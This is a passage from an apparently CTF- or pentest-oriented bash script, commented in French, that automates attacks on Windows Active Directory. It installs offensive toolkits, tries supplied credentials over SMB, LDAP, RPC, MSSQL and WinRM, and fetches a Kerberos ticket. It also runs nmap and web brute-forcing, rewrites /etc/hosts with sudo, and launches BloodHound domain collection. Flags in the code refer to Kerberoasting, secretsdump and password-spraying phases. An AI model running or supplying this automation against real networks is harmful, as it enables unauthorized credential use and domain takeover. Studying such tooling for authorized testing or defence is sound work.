      MSSQLCLIENT_BIN="impacket-mssqlclient"
      record_present_tool "Impacket MSSQL client" "impacket-mssqlclient"
    elif have mssqlclient.py; then
      MSSQLCLIENT_BIN="mssqlclient.py"
      record_present_tool "Impacket MSSQL client" "mssqlclient.py"
    else
      ensure_tool impacket-mssqlclient "Impacket MSSQL client" python3-impacket "git+https://github.com/fortra/impacket.git" || true
      hash -r 2>/dev/null || true
      if have impacket-mssqlclient; then
        MSSQLCLIENT_BIN="impacket-mssqlclient"
      elif have mssqlclient.py; then
        MSSQLCLIENT_BIN="mssqlclient.py"
      fi
    fi
  fi

  if have nxc; then
    SMB_ENUM_TOOL="nxc"
  elif have crackmapexec; then
    SMB_ENUM_TOOL="crackmapexec"
  else
    ensure_tool nxc "NetExec" netexec || true
    hash -r 2>/dev/null || true
    if have nxc; then
      SMB_ENUM_TOOL="nxc"
    elif have crackmapexec; then
      SMB_ENUM_TOOL="crackmapexec"
    else
      bad "Manquant : nxc (netexec) ou crackmapexec"
      return 1
    fi
  fi
  good "Outil d'énumération SMB : $SMB_ENUM_TOOL"

  if [ "$ENUM4LINUX" = "1" ] && ! have jq; then
    ensure_tool jq "jq" jq || true
  fi
  if [ "$ENUM4LINUX" = "1" ] && ! have jq; then
    log "jq introuvable -> parsing JSON enum4linux-ng dégradé."
  fi

  ensure_tool monodis "monodis" mono-utils || true
  ensure_tool strings "strings" binutils || true

  if [ "$WINRM_CHECK" = "1" ]; then
    ensure_tool curl "curl" curl || true
  fi
  if [ "$DNS_ENUM" = "1" ]; then
    ensure_tool dig "dig" dnsutils || true
    ensure_tool host "host" dnsutils || true
    ensure_tool nslookup "nslookup" dnsutils || true
  fi
  if [ "$KERB_USER_ENUM" = "1" ]; then
    ensure_tool kerbrute "kerbrute" kerbrute || true
  fi
  if [ "$ENUM4LINUX" = "1" ]; then
    ensure_tool enum4linux-ng "enum4linux-ng" enum4linux-ng "git+https://github.com/cddmp/enum4linux-ng.git" || true
  fi
  if [ "$NMAP_SCAN" = "1" ]; then
    ensure_tool nmap "nmap" nmap || true
  fi
  if [ "$NTP_SYNC" = "1" ]; then
    ensure_tool ntpdate "ntpdate" ntpdate || true
  fi
  if [ "$WEB_ENUM" = "1" ] && ! have feroxbuster && ! have gobuster && ! have dirb; then
    ensure_tool feroxbuster "feroxbuster" feroxbuster || true
    if ! have feroxbuster && ! have gobuster && ! have dirb; then
      ensure_tool gobuster "gobuster" gobuster || true
    fi
    if ! have feroxbuster && ! have gobuster && ! have dirb; then
      ensure_tool dirb "dirb" dirb || true
    fi
  fi
  if [ "$BLOODHOUND" = "1" ]; then
    ensure_tool bloodhound-python "bloodhound-python" "" bloodhound || true
  fi
  if [ "$LDAPDOMAINDUMP" = "1" ]; then
    ensure_tool ldapdomaindump "ldapdomaindump" "" "git+https://github.com/dirkjanm/ldapdomaindump.git" || true
  fi
  if [ "$CERTIPY" = "1" ]; then
    if have certipy-ad; then
      record_present_tool "certipy-ad" "certipy-ad"
    elif have certipy; then
      record_present_tool "certipy" "certipy"
    else
      ensure_tool certipy-ad "certipy-ad" "" "git+https://github.com/ly4k/Certipy.git" || true
    fi
  fi
  if [ "$BLOODYAD" = "1" ]; then
    if have bloodyAD; then
      record_present_tool "bloodyAD" "bloodyAD"
    elif have bloodyad; then
      record_present_tool "bloodyAD" "bloodyad"
    else
      ensure_tool bloodyAD "bloodyAD" "" "git+https://github.com/CravateRouge/bloodyAD.git" || true
    fi
  fi

  if [ "$INSTALL_ERRORS" -gt 0 ]; then
    log "L'installation automatique a rencontré ${INSTALL_ERRORS} échec(s). Le script continue quand c'est possible."
  fi

  if [ -n "$cache_file" ]; then
    : > "$cache_file" 2>/dev/null || true
  fi
}

# ----------------------------
# /etc/hosts (optional)
# ----------------------------
setup_hosts() {
  if [ "$AUTO_HOSTS" != "1" ]; then
    log "AUTO_HOSTS=0 -> /etc/hosts ignoré"
    return
  fi
  if [ -z "${TARGET:-}" ]; then
    log "TARGET vide -> /etc/hosts ignoré"
    return
  fi
  if [ -z "${DOMAIN:-}" ] && [ -z "${DC:-}" ]; then
    log "DOMAIN/DC non encore connus -> /etc/hosts différé"
    return
  fi
  need sudo

  log "Configuration de /etc/hosts..."
  local tag="# adv_enum_${TARGET}"
  local names=""
  [ -n "${DOMAIN:-}" ] && names="$names ${DOMAIN}"
  if [ -n "${DC:-}" ]; then
    names="$names ${DC}"
    if [[ "$DC" == *.* ]]; then
      names="$names ${DC%%.*}"
    fi
  fi
  names="$(printf '%s\n' "$names" | xargs -n1 2>/dev/null | awk 'NF && !seen[$0]++' | paste -sd' ' -)"
  if [ -z "$names" ]; then
    log "Aucun nom utile à écrire dans /etc/hosts"
    return
  fi
  local hosts_line="${TARGET} ${names} ${tag}"

  run_priv cp /etc/hosts /etc/hosts.bak_adv_enum 2>/dev/null || true
  run_priv sed -i "/${tag//\//\\/}/d" /etc/hosts || true
  run_priv sh -c 'printf "%s\n" "$1" >> /etc/hosts' sh "$hosts_line" || true
  good "Entrée mise à jour : $hosts_line"

  log "Test de résolution de nom..."
  local probe_name="${DC:-${DOMAIN:-}}"
  if [ -n "$probe_name" ] && getent hosts "$probe_name" >/dev/null 2>&1; then
    good "Résolution OK : $probe_name"
  else
    bad "Échec de résolution : ${probe_name:-inconnu} (vérifie /etc/hosts)"
  fi
}

# ============================================================
# Auto-détection NXC
# ============================================================
NXC_HAS=0
NXC_MODULES=""
NXC_SMB_HELP=""
NXC_WINRM_HELP=""
NXC_MSSQL_HELP=""
NXC_LDAP_HELP=""

nxc_detect() {
  if ! have nxc; then
    log "nxc introuvable -> auto-détection NXC ignorée"
    NXC_HAS=0
    return
  fi
  NXC_HAS=1

  local h
  h="$(nxc -h 2>&1 || true)"

  local common="smb winrm mssql ldap rdp wmi ssh ftp vnc nfs"
  local found=""
  for m in $common; do
    if echo "$h" | grep -qiE "(^|[[:space:]\{,])${m}([[:space:]\},]|$)"; then
      found="$found $m"
    fi
  done
  NXC_MODULES="$(echo "$found" | tr ' ' '\n' | sed '/^$/d' | sort -u | tr '\n' ' ')"
  [ -z "${NXC_MODULES// /}" ] && NXC_MODULES="smb"

  good "Modules NXC détectés : ${NXC_MODULES}"

  if echo "$NXC_MODULES" | grep -qw "smb"; then
    NXC_SMB_HELP="$(nxc smb -h 2>&1 || true)"
  fi
  if echo "$NXC_MODULES" | grep -qw "winrm"; then
    NXC_WINRM_HELP="$(nxc winrm -h 2>&1 || true)"
  fi
  if echo "$NXC_MODULES" | grep -qw "mssql"; then
    NXC_MSSQL_HELP="$(nxc mssql -h 2>&1 || true)"
  fi
  if echo "$NXC_MODULES" | grep -qw "ldap"; then
    NXC_LDAP_HELP="$(nxc ldap -h 2>&1 || true)"
  fi
}

nxc_has_opt() {
  local help="$1"
  local opt="$2"
  local esc
  esc="$(printf '%s' "$opt" | sed 's/[][\/.^$*+?|(){}]/\\&/g')"
  echo "$help" | grep -Eq -- "(^|[[:space:],])${esc}([[:space:],]|$)"
}

# ============================================================
# Formats candidats de nom d'utilisateur (test auto)
# ============================================================
build_user_candidates() {
  local raw="$1"
  local dom="$2"
  local base="$raw"

  if echo "$raw" | grep -q '\\'; then
    base="${raw##*\\}"
  elif echo "$raw" | grep -q '@'; then
    base="${raw%%@*}"
  fi

  local cands=()
  cands+=("$raw")
  cands+=("$base")
  cands+=("${dom}\\${base}")
  cands+=("${base}@${dom}")

  local uniq=()
  local seen=""
  for u in "${cands[@]}"; do
    [ -z "$u" ] && continue
    if ! echo " $seen " | grep -qF -- " $u "; then
      uniq+=("$u")
      seen="$seen $u"
    fi
  done

  printf "%s\n" "${uniq[@]}"
}

normalize_user_short() {
  local u="$1"
  u="${u##*\\}"
  u="${u%@*}"
  printf '%s' "$u"
}

ensure_auth_state() {
  if [ "$AUTH_MODE" != "1" ]; then
    return 1
  fi
  if [ "$AUTH_OK" = "1" ]; then
    return 0
  fi
  validate_creds >/dev/null 2>&1 || true
  [ "$AUTH_OK" = "1" ]
}

ensure_ldap_auth() {
  if [ "$AUTH_MODE" != "1" ]; then
    return 1
  fi
  if [ "$LDAP_AUTH_OK" = "1" ]; then
    return 0
  fi

  mkdir -p attack_checks
  local u_short="${AD_USER_BEST:-$AD_USER_RAW}"
  u_short="$(normalize_user_short "$u_short")"
  [ -z "$u_short" ] && return 1

  ldapsearch -x -H "ldap://$TARGET" -D "${u_short}@${DOMAIN}" -w "$AD_PASS" -s base namingcontexts 2>&1 \
    | tee attack_checks/ldap_bind_test.txt | mask_pass >/dev/null || true
  if grep -qiE "namingContexts:" attack_checks/ldap_bind_test.txt 2>/dev/null; then
    LDAP_AUTH_OK=1
    AUTH_OK=1
    return 0
  fi
  return 1
}

# ============================================================
# Validation d'authentification
# ============================================================
AUTH_OK=0
SMB_AUTH_OK=0
LDAP_AUTH_OK=0
RPC_AUTH_OK=0
WINRM_AUTH_OK=0
MSSQL_AUTH_OK=0
GETTGT_OK=0
NMAP_DONE=0
NTP_SYNC_DONE=0
WEB_ENUM_DONE=0
BLOODHOUND_OK=0
LDAPDOMAINDUMP_DONE=0
DNS_ENUM_DONE=0
KERBEROAST_DONE=0
ADCS_ENUM_DONE=0
BLOODYAD_ENUM_DONE=0
MSSQL_ENUM_DONE=0
WINRM_SHELL_DONE=0
GPO_PARSE_DONE=0
LDAP_BASE_DN=""
CTX_ADCS=0
CTX_MSSQL=0
CERTIPY_CA_NAME=""
CERTIPY_ESC_FLAGS=""
CTX_WINRM=0
CTX_DNS=1
SMB_SIGNING_REQUIRED=0
SECRETSDUMP_DONE=0
SNMP_ENUM_DONE=0
FTP_ENUM_DONE=0
SPRAY_DONE=0
LDAPS_ENUM_DONE=0
HOSTS_FOUND=0
HASH_HINTS_DONE=0
POSTAUTH_HINTS_DONE=0

run_save() {
  local outfile="$1"
  shift
  local cmd_escaped=""
  printf -v cmd_escaped "%q " "$@"
  log "CMD: ${cmd_escaped% }"
  "$@" 2>&1 | tee "$outfile" | mask_pass >/dev/null || true
}

looks_auth_ok() {
  local file="$1"
  grep -qiE "(\+|valid|authenticated|pwned)" "$file"
}

select_best_user() {
  if [ "$AUTH_MODE" != "1" ]; then
    return
  fi
  if [ "$NXC_HAS" != "1" ] || ! echo "$NXC_MODULES" | grep -qw "smb"; then
    AD_USER_BEST="$AD_USER_RAW"
    return
  fi

  log "Test automatique des formats de nom d'utilisateur (nxc smb) pour trouver le plus fiable..."
  local candfile="attack_checks/user_candidates.txt"
  build_user_candidates "$AD_USER_RAW" "$DOMAIN" > "$candfile"

  local best=""
  local i=0
  while IFS= read -r u; do
    i=$((i+1))
    [ -z "$u" ] && continue
    local out="attack_checks/userfmt_smb_${i}.txt"
    run_save "$out" nxc smb "$TARGET" -u "$u" -p "$AD_PASS" -d "$DOMAIN" || true
    if looks_auth_ok "$out"; then
      best="$u"
      good "Format utilisateur fonctionnel : $u"
      break
    fi
  done < "$candfile"

  if [ -n "$best" ]; then
    AD_USER_BEST="$best"
  else
    AD_USER_BEST="$AD_USER_RAW"
    bad "Aucun format utilisateur n'a produit de signal d'authentification clair via nxc smb. Conservation du format brut : $AD_USER_BEST"
  fi
}

validate_creds() {
  if [ "$AUTH_MODE" != "1" ]; then
    log "Pas d'identifiants -> validation ignorée."
    return
  fi
  mkdir -p attack_checks

  section "Phase 0 : validation des identifiants"
  local U="$AD_USER_BEST"
  local U_SHORT
  U_SHORT="$(normalize_user_short "$U")"
  local U_LDAP="$U_SHORT"

  if [ "$NXC_HAS" = "1" ] && echo "$NXC_MODULES" | grep -qw "smb"; then
    log "Test de l'auth SMB avec nxc (format utilisateur sélectionné)..."
    run_save "attack_checks/smb_auth_test.txt" nxc smb "$TARGET" -u "$U" -p "$AD_PASS" -d "$DOMAIN" || true
    looks_auth_ok "attack_checks/smb_auth_test.txt" && SMB_AUTH_OK=1 || true
  elif [ "$SMB_ENUM_TOOL" = "crackmapexec" ]; then
    run_save "attack_checks/smb_auth_test.txt" crackmapexec smb "$TARGET" -u "$U" -p "$AD_PASS" -d "$DOMAIN" || true
    looks_auth_ok "attack_checks/smb_auth_test.txt" && SMB_AUTH_OK=1 || true
  fi

  log "Test de la liste des partages smbclient (auth)..."
  smbclient -L "//$TARGET/" -U "${U_SHORT}%${AD_PASS}" -W "$DOMAIN" 2>&1 | tee attack_checks/smbclient_auth_list.txt | mask_pass >/dev/null || true
  grep -qiE "Sharename|Disk|IPC" attack_checks/smbclient_auth_list.txt && SMB_AUTH_OK=1 || true

  log "Test du bind LDAP..."
  ldapsearch -x -H "ldap://$TARGET" -D "${U_LDAP}@${DOMAIN}" -w "$AD_PASS" -s base namingcontexts 2>&1 \
    | tee attack_checks/ldap_bind_test.txt | mask_pass >/dev/null || true
  grep -qiE "namingContexts:" attack_checks/ldap_bind_test.txt && LDAP_AUTH_OK=1 || true

  log "Test de l'auth RPC (enumdomusers)..."
  rpcclient -U "${DOMAIN}\\${U_SHORT}%${AD_PASS}" "$TARGET" -c "enumdomusers;quit" 2>&1 \
    | tee attack_checks/rpc_auth_test.txt | mask_pass >/dev/null || true
  grep -qiE "^user:\[" attack_checks/rpc_auth_test.txt && RPC_AUTH_OK=1 || true

  if [ "$NXC_HAS" = "1" ] && echo "$NXC_MODULES" | grep -qw "mssql"; then
    log "Test de l'auth MSSQL avec nxc..."
    run_save "attack_checks/mssql_auth_test.txt" nxc mssql "$TARGET" -u "$U" -p "$AD_PASS" -d "$DOMAIN" || true
    grep -qiE "(valid|authenticated|\+|version|server)" attack_checks/mssql_auth_test.txt && MSSQL_AUTH_OK=1 || true
  fi

  if [ "$WINRM_CHECK" = "1" ] && [ "$NXC_HAS" = "1" ] && echo "$NXC_MODULES" | grep -qw "winrm"; then
    log "Test de la vérification d'auth WinRM avec nxc..."
    run_save "attack_checks/winrm_auth_test.txt" nxc winrm "$TARGET" -u "$U" -p "$AD_PASS" -d "$DOMAIN" || true
    looks_auth_ok "attack_checks/winrm_auth_test.txt" && WINRM_AUTH_OK=1 || true
  fi

  if [ "$SMB_AUTH_OK" = "1" ] || [ "$LDAP_AUTH_OK" = "1" ] || [ "$RPC_AUTH_OK" = "1" ] || [ "$WINRM_AUTH_OK" = "1" ] || [ "$MSSQL_AUTH_OK" = "1" ]; then
    AUTH_OK=1
    good "Connectivité/auth OK sur au moins un protocole :"
    echo "    USER=${U}"
    echo "    SMB=$SMB_AUTH_OK LDAP=$LDAP_AUTH_OK RPC=$RPC_AUTH_OK WINRM=$WINRM_AUTH_OK MSSQL=$MSSQL_AUTH_OK"
  else
    bad "Aucune authentification réussie détectée (ou services restreints)."
    echo "    USER=${U}"
    echo "    SMB=$SMB_AUTH_OK LDAP=$LDAP_AUTH_OK RPC=$RPC_AUTH_OK WINRM=$WINRM_AUTH_OK MSSQL=$MSSQL_AUTH_OK"
  fi
  update_context_flags
}

run_gettgt_auto() {
  if [ "$AUTH_MODE" != "1" ]; then
    return
  fi
  if [ "$AUTH_OK" != "1" ]; then
    log "GetTGT ignoré (pas encore d'auth confirmée)."
    return
  fi

  local gettgt_bin=""
  if have impacket-getTGT; then
    gettgt_bin="impacket-getTGT"
  elif have impacket-GetTGT; then
    gettgt_bin="impacket-GetTGT"
  else
    log "GetTGT introuvable (optionnel). Astuce : sudo apt install -y impacket-scripts"
    return
  fi

  local U="$AD_USER_BEST"
  U="${U##*\\}"
  U="${U%@*}"
  if [ -z "$U" ]; then
    bad "GetTGT ignoré : impossible de normaliser le nom d'utilisateur depuis '$AD_USER_BEST'"
    return
  fi

  mkdir -p attack_checks
  section "Phase 0b : récupération d'un TGT Kerberos"

  local out="attack_checks/gettgt.txt"
  local ccache="attack_checks/${U}.ccache"
  local ccache_local="${U}.ccache"
  local domain_realm="${DOMAIN^^}"
  local principal="${domain_realm}/${U}:${AD_PASS}"

  log "CMD: ${gettgt_bin} ${domain_realm}/${U}:**** -dc-ip ${TARGET}"
  KRB5CCNAME="$ccache" "$gettgt_bin" "$principal" -dc-ip "$TARGET" 2>&1 | tee "$out" | mask_pass >/dev/null || true

  if [ ! -s "$ccache" ] && [ -s "$ccache_local" ]; then
    mv -f "$ccache_local" "$ccache" 2>/dev/null || true
  fi

  if [ ! -s "$ccache" ]; then
    local saved_ticket
    saved_ticket="$(sed -nE 's/.*Saving ticket in[[:space:]]+([^[:space:]]+).*/\1/p' "$out" | tail -n1)"
    if [ -n "${saved_ticket:-}" ] && [ -s "$saved_ticket" ]; then
      mv -f "$saved_ticket" "$ccache" 2>/dev/null || true
    fi
  fi

  if [ -s "$ccache" ]; then
    GETTGT_OK=1
    good "TGT sauvegardé : $ccache"
    {
      echo "export KRB5CCNAME=$(pwd)/$ccache"
      echo "# utilisation : source attack_checks/kerberos_env.sh"
    } > attack_checks/kerberos_env.sh
    good "Aide env Kerberos : attack_checks/kerberos_env.sh"
    if have klist; then
      log "Vérification du ticket Kerberos (klist) :"
      KRB5CCNAME="$(pwd)/$ccache" klist 2>&1 | tee attack_checks/klist.txt >/dev/null || true
      sed 's/^/  /' attack_checks/klist.txt || true
    else
      log "klist introuvable (optionnel)."
    fi
  else
    bad "GetTGT n'a pas produit de ccache (voir $out)"
  fi
}

update_context_flags() {
  CTX_DNS=1

  if [ "$MSSQL_AUTH_OK" = "1" ]; then
    CTX_MSSQL=1
  elif [ -s nmapresult.txt ] && grep -qE '(^|[[:space:]])1433/tcp[[:space:]]+open' nmapresult.txt 2>/dev/null; then
    CTX_MSSQL=1
  fi

  if [ "$WINRM_AUTH_OK" = "1" ]; then
    CTX_WINRM=1
  elif [ -s attack_checks/winrm_wsman_5985_headers.txt ] && grep -qiE 'HTTP/1|Server:' attack_checks/winrm_wsman_5985_headers.txt 2>/dev/null; then
    CTX_WINRM=1
  elif [ -s nmapresult.txt ] && grep -qE '(^|[[:space:]])5985/tcp[[:space:]]+open|(^|[[:space:]])5986/tcp[[:space:]]+open' nmapresult.txt 2>/dev/null; then
    CTX_WINRM=1
  fi

  if [ -s nmapresult.txt ] && grep -qiE 'certsrv|Active Directory Certificate Services|ssl/http.*certsrv|ms-wbt-server' nmapresult.txt 2>/dev/null; then
    CTX_ADCS=1
  fi
}

phase_nmap_baseline() {
  if [ "$NMAP_SCAN" != "1" ]; then
    log "NMAP_SCAN=0 -> scan nmap de base ignoré"
    return
  fi
  if ! have nmap; then
    log "nmap introuvable -> scan nmap de base ignoré"
    return
  fi

  section "Phase R0 : recon nmap de base"
  nmap -A -Pn -sC -sV "$TARGET" -oN nmapresult.txt -oX nmapresult.xml 2>&1 | tee nmapresult.log >/dev/null || true
  NMAP_DONE=1
  update_context_flags
  good "Résultats Nmap : nmapresult.txt / nmapresult.xml"
}

phase_ntp_sync() {
  if [ "$NTP_SYNC" != "1" ]; then
    log "NTP_SYNC=0 -> synchronisation/vérification ntpdate ignorée"
    return
  fi
  if ! have ntpdate; then
    log "ntpdate introuvable -> synchronisation/vérification de l'heure ignorée"
    return
  fi

  section "Phase 0a : synchronisation horaire Kerberos"
  : > attack_checks/ntp_sync.txt
  if have sudo && [ -t 0 ]; then
    log "CMD: sudo ntpdate -ub ${DC}"
    run_priv ntpdate -ub "$DC" 2>&1 | tee attack_checks/ntp_sync.txt >/dev/null || true
    if ! grep -qiE "(adjust time server|step time server|offset|server)" attack_checks/ntp_sync.txt; then
      log "La synchro NTP via le nom du DC ne semble pas avoir réussi, nouvelle tentative via l'IP cible."
      printf '[*] Fallback NTP via IP cible: %s\n' "$TARGET" | tee -a attack_checks/ntp_sync.txt >/dev/null
      run_priv ntpdate -ub "$TARGET" 2>&1 | tee -a attack_checks/ntp_sync.txt >/dev/null || true
    fi
    if grep -qiE "(adjust time server|step time server)" attack_checks/ntp_sync.txt; then
      good "Synchronisation NTP effectuée"
    elif grep -qiE "(offset|server)" attack_checks/ntp_sync.txt; then
      good "Réponse NTP obtenue"
    else
      bad "Aucune réponse NTP exploitable"
    fi
    NTP_SYNC_DONE=1
    return
  fi

  if have sudo && { sudo -n true 2>/dev/null || [ -n "${SUDO_PASS:-}" ]; }; then
    run_priv ntpdate -ub "$DC" 2>&1 | tee attack_checks/ntp_sync.txt >/dev/null || true
    if ! grep -qiE "(adjust time server|step time server|offset|server)" attack_checks/ntp_sync.txt; then
      printf '[*] Fallback NTP via IP cible: %s\n' "$TARGET" | tee -a attack_checks/ntp_sync.txt >/dev/null
      run_priv ntpdate -ub "$TARGET" 2>&1 | tee -a attack_checks/ntp_sync.txt >/dev/null || true
    fi
    if grep -qiE "(adjust time server|step time server)" attack_checks/ntp_sync.txt; then
      good "Synchronisation NTP effectuée"
    elif grep -qiE "(offset|server)" attack_checks/ntp_sync.txt; then
      good "Réponse NTP obtenue"
    else
      bad "Aucune réponse NTP exploitable"
    fi
    NTP_SYNC_DONE=1
    return
  fi

  ntpdate -q "$DC" 2>&1 | tee attack_checks/ntp_sync.txt >/dev/null || true
  if ! grep -qiE "(offset|server)" attack_checks/ntp_sync.txt; then
    printf '[*] Fallback NTP via IP cible: %s\n' "$TARGET" | tee -a attack_checks/ntp_sync.txt >/dev/null
    ntpdate -q "$TARGET" 2>&1 | tee -a attack_checks/ntp_sync.txt >/dev/null || true
  fi
  NTP_SYNC_DONE=1
  log "ntpdate exécuté en mode requête (-q). Pas de privilège pour régler l'heure système ; Kerberos peut encore échouer à cause du décalage horaire."
  if grep -qiE "(offset|server)" attack_checks/ntp_sync.txt; then
    good "Réponse NTP obtenue (mode requête)"
  else
    bad "Aucune réponse NTP exploitable"
  fi
}

phase_web_enum() {
  if [ "$WEB_ENUM" != "1" ]; then
    log "WEB_ENUM=0 -> découverte web ignorée"
    return
  fi

  section "Phase W1 : découverte web"
  local base_url="http://${DOMAIN}"
  local fallback_url="http://${TARGET}"

  if have curl; then
    curl -ksL --max-time 12 "$base_url" -o web_enum/index_main.html || true
    if [ ! -s web_enum/index_main.html ]; then
      log "URL du domaine injoignable, nouvelle tentative sur l'IP cible."
      curl -ksL --max-time 12 "$fallback_url" -o web_enum/index_main.html || true
      base_url="$fallback_url"
    fi
    if [ -s web_enum/index_main.html ]; then
      grep -Eio "([a-z0-9-]+\.)+${DOMAIN//./\\.}" web_enum/index_main.html \
        | tr '[:upper:]' '[:lower:]' | sort -u > web_enum/vhosts_from_content.txt || true
      if [ -s web_enum/vhosts_from_content.txt ]; then
        good "Vhosts potentiels trouvés dans le contenu web :"
        sed 's/^/  - /' web_enum/vhosts_from_content.txt

        if [ "$AUTO_HOSTS" = "1" ] && have sudo; then
          while IFS= read -r vh; do
            [ -z "$vh" ] && continue
            if ! getent hosts "$vh" >/dev/null 2>&1; then
              run_priv sh -c 'printf "%s\n" "$1" >> /etc/hosts' sh "${TARGET} ${vh} # adv_enum_vhost_${TARGET}" || true
            fi
          done < web_enum/vhosts_from_content.txt
        fi
      fi
    fi
  fi

  if have feroxbuster; then
    feroxbuster -u "$base_url" -w "$WEB_WORDLIST" -k -n -q -o web_enum/ferox_dirs.txt >/dev/null 2>&1 || true
  elif have gobuster; then
    gobuster dir -u "$base_url" -w "$WEB_WORDLIST" -q -o web_enum/gobuster_dirs.txt >/dev/null 2>&1 || true
    gobuster vhost -u "http://$TARGET" --domain "$DOMAIN" -w "$WEB_WORDLIST" -q -o web_enum/gobuster_vhosts.txt >/dev/null 2>&1 || true
  elif have dirb; then
    dirb "$base_url" "$WEB_WORDLIST" 2>&1 | tee web_enum/dirb_dirs.txt >/dev/null || true
  else
    log "Aucun outil d'énumération web trouvé (feroxbuster/gobuster/dirb)."
  fi

  WEB_ENUM_DONE=1
}

resolve_host_ipv4() {
  local host_name="$1"
  local ips=""

  if [ -z "${host_name:-}" ]; then
    echo "unresolved"
    return
  fi

  if have getent; then
    ips="$(getent ahostsv4 "$host_name" 2>/dev/null | awk '{print $1}' | sort -u | paste -sd, - || true)"
  fi

  if [ -z "$ips" ] && have host; then
    ips="$(host "$host_name" 2>/dev/null | awk '/has address/ {print $4}' | sort -u | paste -sd, - || true)"
  fi

  if [ -n "$ips" ]; then
    echo "$ips"
  else
    echo "unresolved"
  fi
}

append_bloodhound_summary() {
  local report_file="${1:-bloodhound_collect.txt}"
  local bh_dir="${2:-bloodhound}"
  local prefix="${3:-}"
  local computers_json users_json groups_json

  if [ -n "$prefix" ]; then
    computers_json="$(find "$bh_dir" -maxdepth 1 -type f -name "${prefix}*_computers.json" -size +0c -printf '%f\n' | sort | tail -n1 || true)"
    users_json="$(find "$bh_dir" -maxdepth 1 -type f -name "${prefix}*_users.json" -size +0c -printf '%f\n' | sort | tail -n1 || true)"
    groups_json="$(find "$bh_dir" -maxdepth 1 -type f -name "${prefix}*_groups.json" -size +0c -printf '%f\n' | sort | tail -n1 || true)"
  else
    computers_json="$(find "$bh_dir" -maxdepth 1 -type f -name '*_computers.json' -size +0c -printf '%f\n' | sort | tail -n1 || true)"
    users_json="$(find "$bh_dir" -maxdepth 1 -type f -name '*_users.json' -size +0c -printf '%f\n' | sort | tail -n1 || true)"
    groups_json="$(find "$bh_dir" -maxdepth 1 -type f -name '*_groups.json' -size +0c -printf '%f\n' | sort | tail -n1 || true)"
  fi

  {
    echo
    echo "================ Résumé BloodHound ================"
    echo "Domaine : ${DOMAIN}"
    [ -n "$computers_json" ] && echo "JSON postes :   ${computers_json}"
    [ -n "$users_json" ] && echo "JSON comptes :  ${users_json}"
    [ -n "$groups_json" ] && echo "JSON groupes :  ${groups_json}"
  } >> "$report_file"

  if [ -n "$computers_json" ] && have jq; then
    {
      echo
      echo "[Postes]"
      echo "Nom | IP(s) | sAMAccountName | OS"
      echo "----------------------------------"
    } >> "$report_file"

    jq -r '
      .data[]
      | .Properties as $p
      | [
          ($p.name // "unknown"),
          ($p.samaccountname // ""),
          ($p.operatingsystem // $p.operatingsystemname // "")
        ]
      | @tsv
    ' "$bh_dir/$computers_json" 2>/dev/null \
      | while IFS=$'\t' read -r comp_name comp_sam comp_os; do
          [ -z "${comp_name:-}" ] && continue
          printf '%s | %s | %s | %s\n' \
            "$comp_name" \
            "$(resolve_host_ipv4 "$comp_name")" \
            "${comp_sam:--}" \
            "${comp_os:--}" \
            >> "$report_file"
        done
  fi

  if [ -n "$users_json" ] && have jq; then
    {
      echo
      echo "[Comptes]"
      echo "sAMAccountName | Nom | Nom affiché | Description"
      echo "--------------------------------------------------"
    } >> "$report_file"

    jq -r '
      .data[]
      | .Properties as $p
      | [
          ($p.samaccountname // (($p.name // "unknown") | split("@")[0])),
          ($p.name // "unknown"),
          ($p.displayname // ""),
          ($p.description // "")
        ]
      | @tsv
    ' "$bh_dir/$users_json" 2>/dev/null \
      | sort -u \
      | while IFS=$'\t' read -r sam full_name display_name description; do
          printf '%s | %s | %s | %s\n' \
            "${sam:--}" \
            "${full_name:--}" \
            "${display_name:--}" \
            "${description:--}" \
            >> "$report_file"
        done
  fi

  if { [ -n "$computers_json" ] || [ -n "$users_json" ] || [ -n "$groups_json" ]; } && have jq; then
    {
      echo
      echo "[Compteurs]"
      if [ -n "$computers_json" ]; then
        printf 'Postes : %s\n' "$(jq -r '.meta.count // (.data | length) // 0' "$bh_dir/$computers_json" 2>/dev/null || echo 0)"
      fi
      if [ -n "$users_json" ]; then
        printf 'Comptes : %s\n' "$(jq -r '.meta.count // (.data | length) // 0' "$bh_dir/$users_json" 2>/dev/null || echo 0)"
      fi
      if [ -n "$groups_json" ]; then
        printf 'Groupes : %s\n' "$(jq -r '.meta.count // (.data | length) // 0' "$bh_dir/$groups_json" 2>/dev/null || echo 0)"
      fi
    } >> "$report_file"
  fi
}

run_bloodhound_cmd() {
  local timeout_secs="$1"
  shift
  if have timeout && echo "$timeout_secs" | grep -Eq '^[0-9]+$' && [ "$timeout_secs" -gt 0 ]; then
    timeout "${timeout_secs}s" "$@"
  else
    "$@"
  fi
}

phase_bloodhound_collect() {
  if [ "$BLOODHOUND" != "1" ]; then
    log "BLOODHOUND=0 -> collecte BloodHound ignorée"
    return
  fi
  if [ "$AUTH_MODE" != "1" ] || ! ensure_auth_state; then
    log "Collecte BloodHound ignorée (pas d'identifiants valides confirmés)."
    return
  fi
  if ! have bloodhound-python; then
    log "bloodhound-python introuvable -> collecte ignorée"
    return
  fi

  local U="$AD_USER_BEST"
  U="${U##*\\}"
  U="${U%@*}"
  [ -z "$U" ] && U="$AD_USER_RAW"
  local user_upn="$U"
  if ! echo "$user_upn" | grep -q '@'; then
    user_upn="${U}@${DOMAIN}"
  fi
  local bh_timeout="${BLOODHOUND_TIMEOUT_SECS:-240}"
  local bh_prefix
  bh_prefix="$(date +%Y%m%d_%H%M%S)_${TARGET//./_}"
  local bh_dir="bloodhound"
  local bh_zip=""
  local bh_json_count=0
  local bh_gc_issue=0
  local bh_min_json_success=3
  local bh_mode_label="All"

  section "Phase 3e : collecte BloodHound"
  mkdir -p "$bh_dir"
  : > bloodhound_collect.txt
  local bh_cmd=()
  if [ -n "${AD_PASS:-}" ]; then
    bh_cmd=(bloodhound-python
      -u "$user_upn" -p "$AD_PASS" --auth-method ntlm
      -d "$DOMAIN" -c All -ns "$TARGET" -dc "$DC" --dns-tcp --disable-autogc --dns-timeout 5 --zip -op "$bh_prefix")
  elif [ "$GETTGT_OK" = "1" ] && [ -f "attack_checks/${U}.ccache" ]; then
    bh_cmd=(env "KRB5CCNAME=$(pwd)/attack_checks/${U}.ccache" bloodhound-python
      -u "$user_upn" -k -no-pass --auth-method kerberos
      -d "$DOMAIN" -c All -ns "$TARGET" -dc "$DC" --dns-tcp --disable-autogc --dns-timeout 5 --zip -op "$bh_prefix")
  else
    log "Aucun mot de passe ni ccache utilisable pour BloodHound"
    return
  fi
  log "Pré-vérification BloodHound : bind LDAP authentifié déjà confirmé=$LDAP_AUTH_OK"
  log "CMD: ${bh_cmd[*]}"
